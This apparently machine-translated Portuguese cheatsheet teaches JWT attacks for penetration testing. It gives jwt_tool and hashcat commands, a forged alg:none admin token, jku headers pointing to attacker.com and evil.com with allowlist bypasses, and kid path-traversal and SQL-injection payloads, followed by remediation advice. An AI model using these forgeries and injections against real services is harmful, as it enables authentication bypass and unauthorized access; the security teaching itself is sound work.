<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎟️ Ataques JWT - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
       ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
       ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
       ██║██║ █╗ ██║   ██║       ███████║   ██║      ██║   ███████║██║     █████═╝ ███████╗
  ██   ██║██║███╗██║   ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║
  ╚█████╔╝╚███╔███╔╝   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║
   ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
             JSON Web Token Exploitation & Security Testing Guide
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="Ataques JWT">
  <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Ataques-chave">
  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="Teste de API">
</p>

<p alinhar="centro">
  <b>🛡️ Metodologia abrangente e comandos práticos para explorar vulnerabilidades JSON Web Token (JWT)</b>
</p>

---

## 📋 Índice

- [Introdução e anatomia de um JWT](#-introdução--anatomia-de-a-jwt)
- [Ferramentas de teste essenciais](#-essential-testing-tools)
- [Matriz de vulnerabilidade e vetores de ataque](#-matriz de vulnerabilidade--vetores de ataque)
  - [1. Nenhuma falha no algoritmo (`alg: "none"`)](#1-none-algorithm-flaw-alg-none)
  - [2. Quebra fraca de segredo HMAC (HS256)](#2-fraca-hmac-secret-cracking-hs256)
  - [3. Confusão de algoritmo/confusão de chave (RS256 -> HS256)](#3-algorithm-confusion--key-confusion-rs256---hs256)
  - [4. Injeção de cabeçalho JWK (chave da Web JSON)](#4-jwk-json-web-key-header-injection)
  - [5. Configuração incorreta de JKU (URL de definição de JWK) e SSRF](#5-jku-jwk-set-url-misconfiguration--ssrf)
  - [6. Manipulação e injeções de cabeçalho KID (ID-chave)](#6-kid-key-id-header-manipulation--injections)
  - [7. Retransmissão entre serviços e vazamento de dados confidenciais](#7-retransmissão entre serviços - vazamento de dados confidenciais)
- [Automatizando testes com `jwt_tool`](#-automating-tests-with-jwt_tool)
- [Quebrando segredos JWT com Hashcat](#-cracking-jwt-secrets-with-hashcat)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Remediação e implementação segura](#-remediação--implementação segura)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)
- [Recursos](#-recursos)

---

## 🎯 Introdução e anatomia de um JWT

Um **JSON Web Token (JWT)** é um meio compacto e seguro para URL de representar reivindicações entre duas partes. Comumente usado para autenticação de sessão em APIs REST modernas, aplicativos de página única (SPAs) e microsserviços.

Um JWT padrão consiste em três partes codificadas em Base64URL separadas por pontos (`.`):
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
[------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
```
1. **Cabeçalho:** Identifica o tipo de token e o algoritmo criptográfico utilizado (por exemplo, `HS256`, `RS256`, `none`).
2. **Carga útil:** Contém as declarações (por exemplo, `user_id`, `role`, expiração `exp`). *Observação: as cargas úteis são codificadas, NÃO criptografadas!*
3. **Assinatura:** Criada por hash do cabeçalho e da carga útil codificados usando uma chave secreta ou chave privada.

---

## 🛠️ Ferramentas de teste essenciais

1. **jwt_tool:** Kit de ferramentas de linha de comando para analisar, testar e quebrar JWTs.
2. **Hashcat:** Rápida quebra de segredo HMAC baseada em GPU (Modo `16500`).
3. **Extensão Burp Suite:** "JWT Editor" de Fraser Winterborn (na PortSwigger BApp Store).

### Instalando `jwt_tool`
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
```
---

## 💥 Matriz de vulnerabilidade e vetores de ataque

### 1. Nenhuma falha no algoritmo (`alg: "none"`)

**Mecanismo:**
Algumas bibliotecas de verificação JWT consideram os tokens válidos se o cabeçalho `alg` estiver definido como `none`, ignorando completamente a verificação de assinatura.

**Exploração:**
1. Decodifique o cabeçalho e altere `"alg": "HS256"` para `"alg": "none"`.
2. Modifique as declarações de carga útil (por exemplo, `"role": "admin"`).
3. Remova a parte da assinatura (mantenha o ponto final!).
```bash
# Using jwt_tool to forge 'none' algorithm token
python3 jwt_tool.py <TOKEN> -X a

# Test various casing variations (none, None, NONE, nOnE)
python3 jwt_tool.py <TOKEN> -T -S none
```
*Estrutura manual do token:*
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```
---

### 2. Fraca quebra secreta do HMAC (HS256)

**Mecanismo:**
Se o servidor assinar tokens usando algoritmos simétricos (`HS256`, `HS384`, `HS512`) com uma chave secreta adivinhada ou fraca (por exemplo, `secret`, `admin123`, nome da empresa), um invasor poderá usar força bruta no segredo off-line e assinar tokens arbitrários.

**Cracking com Hashcat:**
```bash
# Save the full JWT to a file
echo "eyJhbGciOi..." > jwt.txt

# Crack using Hashcat Mode 16500 (JWT Secret)
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```
**Forjando token após crackear:**
```bash
python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
```
---

### 3. Confusão de algoritmo/confusão de chave (RS256 -> HS256)

**Mecanismo:**
- **RS256 (Assimétrico):** Assinado com a chave privada do servidor; verificado com a **chave pública** do servidor.
- **HS256 (Simétrico):** Assinado e verificado com o **mesmo segredo compartilhado**.

Se a biblioteca de back-end não aplicar estritamente os tipos de algoritmo, um invasor poderá:
1. Obtenha a chave pública do servidor (geralmente exposta publicamente em `/.well-known/jwks.json` ou certificados).
2. Altere o cabeçalho do algoritmo do token de `RS256` para `HS256`.
3. Assine o token modificado com a **chave pública** do servidor como segredo HMAC!
4. O servidor recebe o token, vê `HS256` e verifica a assinatura usando sua chave de verificação configurada (que é sua chave pública), resultando em uma assinatura válida!

**Exploração via `jwt_tool`:**
```bash
# Supply the server's public key and perform key confusion
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
```
---

### 4. Injeção de cabeçalho JWK (chave da Web JSON)

**Mecanismo:**
A especificação JWT permite uma chave pública incorporada no parâmetro de cabeçalho `jwk`. Servidores vulneráveis ​​confiam nesta chave de cabeçalho para verificar a assinatura sem verificar se a chave pertence a uma CA confiável ou a uma lista de permissões pré-compartilhada.

**Exploração:**
1. Gere um par de chaves RSA do invasor.
2. Incorpore a chave pública no cabeçalho `jwk`.
3. Assine o token com sua chave privada correspondente.
```bash
# Inject self-signed key in header using jwt_tool
python3 jwt_tool.py <TOKEN> -X i
```
---

### 5. Configuração incorreta de JKU (URL de definição de JWK) e SSRF

**Mecanismo:**
O cabeçalho `jku` (JWK Set URL) especifica uma URL remota da qual o servidor deve buscar o conjunto de chave pública para verificar o token.

**Exploração:**
1. Hospede seu próprio `jwks.json` em um servidor web invasor:
   ```json
   {
     "keys": [
       {
         "kty": "RSA",
         "e": "AQAB",
         "use": "sig",
         "kid": "attacker-key",
         "n": "..."
       }
     ]
   }
   ```
2. Modifique o cabeçalho do token:
   ```json
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "http://attacker.com/jwks.json",
     "kid": "attacker-key"
   }
   ```
3. Assine o token com sua chave privada.

> **Ignorando listas de permissões de URL:**
> Se o aplicativo validar terminações de domínio, teste redirecionamentos abertos ou peculiaridades de análise de URL:
> -`https://trusted.com@attacker.com/jwks.json`
> -`https://trusted.com.attacker.com/jwks.json`
> - Redirecionamento aberto: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`

---

### 6. Manipulação e injeções de cabeçalho KID (Key ID)

O cabeçalho `kid` é uma string usada para identificar qual chave deve ser carregada de um banco de dados ou sistema de arquivos.

#### A. Travessia de diretório para arquivo vazio (`/dev/null`)
Se o servidor ler o arquivo de chave do disco usando `kid`:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/dev/null"
}
```
Assine o token com um segredo vazio (`""`/0 bytes)!

#### B. Injeção de SQL via KID
Se o servidor buscar o segredo de um banco de dados:
```sql
SELECT secret FROM keys WHERE kid = 'INPUT';
```
Injete uma string estática conhecida:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'my_known_secret'-- -"
}
```
Assine o token usando o segredo `'my_known_secret'`.

---

### 7. Retransmissão entre serviços e vazamento de dados confidenciais

- **PII não criptografadas:** Os desenvolvedores frequentemente armazenam senhas, SSNs ou metadados confidenciais do usuário na carga útil, esquecendo que ela é apenas codificada em Base64URL, não criptografada.
- **Confusão de serviços:** uso de um token destinado a um serviço de baixo privilégio (por exemplo, API analítica) em uma API administrativa interna.

---

## ⚡ Automatizando testes com `jwt_tool`

### Execute todos os ataques do Playbook integrados
A maneira mais fácil de verificar automaticamente todas as vulnerabilidades conhecidas:
```bash
# Launch full automated playbook scan
python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
```
### Modo Interativo de Adulteração
```bash
# Interactively edit header or payload claims
python3 jwt_tool.py <TOKEN> -T
```
---

## 🔓 Quebrando segredos JWT com Hashcat
```bash
# 1. Format: Put token alone in a file
echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt

# 2. Dictionary attack using rockyou
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3

# 3. Rule-based attack
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
---

## 📊 Tabela de referência rápida

| Vulnerabilidade | Técnica de Ataque | Carga útil/sinalizador chave |
|---------------|------------------|--------------------|
| **Nenhum Algoritmo** | Definir `alg: "none"`, assinatura de tira | `jwt_tool <TOKEN> -X a` |
| **Segredo Fraco** | Força bruta do dicionário GPU | `hashcat -m 16500 jwt.txt rockyou.txt` |
| **Confusão de algoritmos**| Alterar RS256 para HS256, assinar com chave pública | `jwt_tool <TOKEN> -X k -pk pub.pem` |
| **Injeção JWK** | Incorporar a chave pública do invasor no cabeçalho | `jwt_tool <TOKEN> -X i` |
| **Injeção JKU** | Aponte `jku` para servidor externo | `"jku": "http://evil.com/jwks.json"` |
| **Travessia do caminho KID**| Aponte `kid` para `/dev/null` ou arquivo conhecido | `"kid": "/dev/null"` (Assine com `""`) |
| **KID SQLi** | Injetar segredo estático na consulta SQL | `"kid": "' UNION SELECT 'secret'-- -"` |

---

## 🛡️ Correção e implementação segura

1. **Algoritmos explicitamente da lista de permissões:**
   Nunca permita a seleção `alg` controlada pelo cliente. Algoritmos permitidos por código fixo no servidor (por exemplo, permitir exclusivamente `RS256`).
2. **Rejeitar tokens `alg: none`:**
   Certifique-se de que a biblioteca rejeite estritamente tokens não verificados ou não assinados.
3. **Use segredos longos e criptograficamente seguros:**
   Os segredos HMAC devem ter pelo menos 256 bits (mais de 32 caracteres aleatórios) gerados por um CSPRNG seguro.
4. **Valide os cabeçalhos `jku` e `jwk`:**
   Busque apenas conjuntos JWK de uma lista de permissões estrita de URLs confiáveis internos; rejeitar domínios externos fornecidos pelo usuário.
5. **Higienizar valores `kid`:**
   Trate `kid` como entrada de usuário não confiável; higienizar contra passagem de diretório (`../`) e injeção de SQL.

---

## ⚠️ Isenção de responsabilidade legal

> **IMPORTANTE:** Os ataques JWT podem levar ao desvio total da autenticação e ao acesso não autorizado aos bancos de dados do aplicativo. Este guia destina-se estritamente a fins educacionais e testes de penetração autorizados.

---

## 📚 Recursos

- [Repositório jwt_tool GitHub](https://github.com/ticarpi/jwt_tool)
- [PortSwigger Web Security Academy: ataques JWT](https://portswigger.net/web-security/jwt)
- [RFC 7519 - Padrão JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)